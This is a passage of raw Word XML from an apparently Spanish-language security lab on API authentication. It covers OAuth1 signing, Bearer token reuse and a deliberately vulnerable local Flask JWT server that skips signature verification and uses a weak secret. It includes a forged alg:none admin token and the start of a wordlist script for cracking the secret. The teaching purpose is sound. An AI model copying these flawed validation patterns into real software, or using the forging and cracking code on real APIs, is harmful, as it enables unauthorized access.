          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import hmac, hashlib, base64, urllib.parse</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>method, url = "GET", "https://api.ejemplo.com/recurso"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>params = {"oauth_consumer_key": "key", "oauth_nonce": "abc123", "oauth_timestamp": "1700000000"}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>base = "&amp;".join([method,</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                 urllib.parse.quote(url, safe=""),</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                 urllib.parse.quote("&amp;".join(f"{k}={params[k]}" for k in sorted(params)), safe="")])</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sig = base64.b64encode(hmac.new(b"secreto", base.encode(), hashlib.sha1).digest()).decode()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print("base string:", base)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print("oauth_signature:", urllib.parse.quote(sig))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python oauth1_sign.py</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> se imprime la </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>base string</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y una firma.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cada request se firma; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cambiar un parámetro invalida la firma</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. Es la idea que DPoP recupera 13 años después.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Probalo: cambiá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>"abc123"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> por </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>"abc124"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y volvé a correr. La firma cambia por completo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 4 — Bearer: reutilización (sólo tu entorno)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curl -s -H "Authorization: Bearer token-de-ejemplo" https://httpbin.org/bearer</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado: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1F3B66"/>
        </w:rPr>
        <w:t>{"authenticated": true, "token": "token-de-ejemplo"}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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el servidor no distingue quién porta el token; si lo tenés, entrás. (En clase: copiá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> token y usalo desde otra terminal contra </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> API.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 5 — Cookies (opcional, con Juice Shop)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docker run -d -p 3000:3000 --name juice bkimminich/juice-shop</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Abrí http://localhost:3000, registrate, y en DevTools → Application → Cookies mirá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>HttpOnly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Secure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SameSite</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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la diferencia entre sesión en cookie (navegador) y bearer en cabecera (API).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte B — Laboratorio JWT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Este laboratorio es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>deliberadamente vulnerable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y corre </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sólo en local</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 6 — Preparar entorno Python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mkdir -p jwt-lab &amp;&amp; cd jwt-lab</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python -m venv .venv</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>source .venv/Scripts/activate   # Windows Git Bash   (Linux/macOS: source .venv/bin/activate)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>pip install flask pyjwt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 7 — Crear el servidor vulnerable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cat &gt; lab_jwt.py &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## lab_jwt.py — DELIBERADAMENTE VULNERABLE. Sólo 127.0.0.1. NO usar en producción.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from flask import Flask, request, jsonify</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt, datetime</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>app = Flask(__name__)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>WEAK_SECRET = "secreto"          # débil a propósito (crackeable)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def bearer():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return request.headers.get("Authorization", "").replace("Bearer ", "").strip()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def mint(sub="1", scope="read", aud="lab", exp_min=15):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    payload = {"sub": sub, "scope": scope, "aud": aud, "iss": "https://mi-lab",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">               "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(minutes=exp_min)}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jwt.encode(payload, WEAK_SECRET, algorithm="HS256")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>@app.route("/token")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def token():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jsonify(token=mint())</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>@app.route("/vuln/novalida")      # simula verificación ausente</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def vuln_novalida():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jsonify(ok=True, claims=jwt.decode(bearer(), options={"verify_signature": False}))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>@app.route("/vuln/debil")         # secreto débil + no exige exp ni aud</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def vuln_debil():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jsonify(ok=True, claims=jwt.decode(bearer(), WEAK_SECRET, algorithms=["HS256"],</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                                              options={"verify_aud": False, "verify_exp": False}))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>@app.route("/safe")               # verificación correcta</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def safe():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    claims = jwt.decode(bearer(), WEAK_SECRET, algorithms=["HS256"], audience="lab")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jsonify(ok=True, claims=claims)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    app.run(host="127.0.0.1", port=5000)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python lab_jwt.py</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Dejalo corriendo. En </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>otra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> terminal: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curl -s http://127.0.0.1:5000/token | jq -r .token &gt; token.txt</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>TOKEN=$(cat token.txt)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:5000/safe | jq</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Paso 8 — Ataque </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>alg: none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python - &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt, datetime</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>payload = {"sub": "999", "scope": "admin", "aud": "lab", "iss": "https://mi-lab",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">           "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=1)}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>forge = jwt.encode(payload, None, algorithm="none")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>open("forged_none.txt", "w").write(forge)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print("token forjado:", forge)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>FORGED=$(cat forged_none.txt)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "--- /vuln/novalida (acepta) ---"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:5000/vuln/novalida | jq</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "--- /safe (debe rechazar) ---"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:5000/safe | jq</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado: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1F3B66"/>
        </w:rPr>
        <w:t>/vuln/novalida</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> devuelve </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>claims</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>"scope":"admin"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>/safe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> responde error 401.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si el validador no verifica la firma (o confía en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>alg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>), el token forjado pasa.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 9 — Crackear el secreto débil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cat &gt; crack.py &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt, sys</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>tok = open("token.txt").read().strip()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>words = ["123456","password","secreto","clave","admin","secret","jwt","token"]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>for w in words:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
